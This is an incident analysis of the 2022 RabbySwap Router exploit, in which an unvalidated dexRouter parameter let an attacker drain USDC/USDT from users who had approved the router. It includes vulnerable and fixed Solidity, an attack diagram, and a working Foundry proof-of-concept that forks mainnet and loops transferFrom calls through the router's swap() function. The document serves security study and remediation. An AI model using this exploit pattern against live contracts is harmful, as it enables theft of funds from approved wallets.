# RabbyWallet — SwapRouter Arbitrary External Call Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | RabbySwap Router |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$200,000 (114 ETH transferred via Tornado Cash) |
| **Vulnerable Contract** | [0x6eb211caf6d304a76efe37d9abdfaddc2d4363d1](https://etherscan.io/address/0x6eb211caf6d304a76efe37d9abdfaddc2d4363d1) |
| **Attack Contract** | [0x9682f31b3f572988f93c2b8382586ca26a866475](https://etherscan.io/address/0x9682f31b3f572988f93c2b8382586ca26a866475) |
| **Attacker** | [0xb687550842a24d7fbc6aad238fd7e0687ed59d55](https://etherscan.io/address/0xb687550842a24d7fbc6aad238fd7e0687ed59d55) |
| **USDT** | [0xdAC17F958D2ee523a2206206994597C13D831ec7](https://etherscan.io/address/0xdAC17F958D2ee523a2206206994597C13D831ec7) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **Root Cause** | The `dexRouter` parameter of the `swap()` function is used to call arbitrary contracts without validation |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/RabbyWallet_SwapRouter_exp.sol) |

---
## 1. Vulnerability Overview

The RabbySwap Router's `swap()` function was designed to call an external router (`dexRouter`) to facilitate DEX swaps. The issue was the absence of any validation on the `dexRouter` parameter. The attacker compiled a list of 29 victims who had previously granted USDC/USDT approvals to the RabbySwap Router. For each victim, the attacker called `swap()` with `dexRouter` set to the USDC contract address and calldata set to `transferFrom(victim, attacker, balance)`. Since the Router contract executed `transferFrom()` under its own identity, the victims' tokens were transferred to the attacker.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable swap() - no validation on dexRouter parameter
contract RabbySwapRouter {
    function swap(
        address dexRouter,      // ❌ Allows arbitrary contract address
        bytes calldata routerCalldata,  // ❌ Allows arbitrary calldata
        address inputToken,
        uint256 inputAmount,
        address outputToken,
        uint256 minOutputAmount
    ) external payable returns (uint256 outputAmount) {
        // Transfer input token
        IERC20(inputToken).transferFrom(msg.sender, address(this), inputAmount);

        // ❌ Executes dexRouter as arbitrary contract with arbitrary calldata
        // Called under the Router contract's identity (address(this)),
        // allowing it to transfer tokens that victims approved to the Router
        (bool success,) = dexRouter.call(routerCalldata);
        require(success, "Swap failed");

        outputAmount = IERC20(outputToken).balanceOf(address(this));
        require(outputAmount >= minOutputAmount, "Insufficient output");
    }
}

// ✅ Correct pattern - only calls whitelisted DEX routers
contract SafeRabbySwapRouter {
    mapping(address => bool) public allowedDexRouters;

    function setAllowedRouter(address router, bool allowed) external onlyOwner {
        allowedDexRouters[router] = allowed;
    }

    function swap(
        address dexRouter,
        bytes calldata routerCalldata,
        address inputToken,
        uint256 inputAmount,
        address outputToken,
        uint256 minOutputAmount
    ) external payable returns (uint256 outputAmount) {
        // ✅ Only whitelisted routers can be called
        require(allowedDexRouters[dexRouter], "Router not allowed");
        // ✅ Block token manipulation selectors: transferFrom, approve, etc.
        bytes4 selector = bytes4(routerCalldata[:4]);
        require(selector != IERC20.transferFrom.selector, "Forbidden selector");
        require(selector != IERC20.transfer.selector, "Forbidden selector");

        IERC20(inputToken).transferFrom(msg.sender, address(this), inputAmount);
        (bool success,) = dexRouter.call(routerCalldata);
        require(success, "Swap failed");

        outputAmount = IERC20(outputToken).balanceOf(address(this));
        require(outputAmount >= minOutputAmount, "Insufficient output");
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompiled


**RabbyWallet_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: the `dexRouter` parameter of the `swap()` function is used to call arbitrary contracts without validation
    function swap(address arg0, uint256 arg1, address arg2, uint256 arg3, address arg4, address arg5, bytes arg6, uint256 arg7) external view returns (uint256) {}  // 0x32854cc2  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Reconnaissance: compile list of 29 victims who approved the RabbySwap Router
    │       Verify each victim's USDC/USDT balance and allowance
    │
    ├─[2] Iterate over each victim:
    │       dexRouter  = USDC contract address
    │       calldata   = transferFrom(victim, attacker, victimBalance)
    │       inputToken = USDC (nominal)
    │
    ├─[3] Call RabbySwapRouter.swap(
    │         dexRouter  = USDC,
    │         calldata   = transferFrom(victim, attacker, amount),
    │         ...
    │       )
    │       ❌ No validation on dexRouter
    │       → Router executes USDC.transferFrom(victim, attacker, amount)
    │       → Router is msg.sender, so it can consume the victim's allowance
    │
    ├─[4] Repeat for 29 victims → collect USDC/USDT
    │
    └─[5] 114 ETH → transferred to Tornado Cash
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IRabbyRouter {
    function swap(
        address dexRouter,
        bytes calldata routerCalldata,
        address inputToken,
        uint256 inputAmount,
        address outputToken,
        uint256 minOutputAmount
    ) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract RabbyExploit is Test {
    IRabbyRouter router = IRabbyRouter(0x6eb211caf6d304a76efe37d9abdfaddc2d4363d1);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    // List of victim addresses that had previously approved the router
    address[] victims;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_724_451);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDC", USDC.balanceOf(address(this)), 6);

        // Execute attack against each victim
        for (uint256 i = 0; i < victims.length; i++) {
            address victim = victims[i];
            uint256 allowance = USDC.allowance(victim, address(router));
            uint256 balance = USDC.balanceOf(victim);
            uint256 amount = allowance < balance ? allowance : balance;

            if (amount == 0) continue;

            // [Core Attack] dexRouter = USDC contract
            // calldata = transferFrom(victim → attacker, amount)
            bytes memory callData = abi.encodeWithSelector(
                bytes4(keccak256("transferFrom(address,address,uint256)")),
                victim,           // ← victim
                address(this),    // ← attacker
                amount
            );

            // ⚡ Router transfers victim's USDC under its own identity
            router.swap(
                address(USDC),  // dexRouter = USDC contract
                callData,
                address(USDC),  // inputToken (nominal)
                0,
                address(USDC),  // outputToken (nominal)
                0
            );
        }

        emit log_named_decimal_uint("[End] Attacker USDC", USDC.balanceOf(address(this)), 6);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary External Call via controllable dexRouter parameter |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Arbitrary Call Vulnerability |
| **Attack Vector** | `swap(dexRouter=USDC, calldata=transferFrom(victim, attacker, all))` |
| **Preconditions** | Victims have approved the RabbySwap Router for token spending; `dexRouter` parameter is not validated |
| **Impact** | ~$200,000 in USDC/USDT drained from victim accounts |

---
## 6. Remediation Recommendations

1. **Allowed Router Whitelist**: Pre-register callable DEX router addresses using an `allowedDexRouters` mapping and reject any unregistered addresses.
2. **Block Dangerous Selectors**: Inspect the first 4 bytes of calldata and reject execution of token transfer-related function selectors such as `transfer()`, `transferFrom()`, and `approve()`.
3. **Prohibit Token Contract Calls**: Explicitly block the use of `inputToken` or `outputToken` addresses as the `dexRouter` target.

---
## 7. Lessons Learned

- **The Power of Aggregated Attacks**: Unlike single-victim attacks, collecting a list of approved addresses and targeting dozens of victims sequentially causes individually small losses to accumulate into massive total damage.
- **Router as msg.sender**: A swap router calls DEXes on behalf of users, making the contract itself the `msg.sender`. This means the router can arbitrarily consume token approvals that victims have granted to it.
- **Importance of Parameter Validation**: Any design that allows users to fully control both the external call target (`dexRouter`) and the calldata will always result in an arbitrary call vulnerability. In router patterns, all external call targets must be restricted to a pre-approved whitelist.